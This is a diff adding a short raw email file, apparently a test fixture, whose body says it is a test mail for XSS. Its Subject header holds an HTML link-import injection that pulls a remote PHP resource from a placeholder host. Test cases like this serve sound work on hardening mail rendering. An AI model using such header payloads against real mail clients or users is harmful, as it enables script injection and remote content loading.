@@ -1,0 +1,7 @@
+From: =?GB2312?B?s8zQob3j?= <fdsa232@home.gopas.de>
+To: traviswc@aol.com
+Subject: <link rel="import" href="http://xxx.com/1.php">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
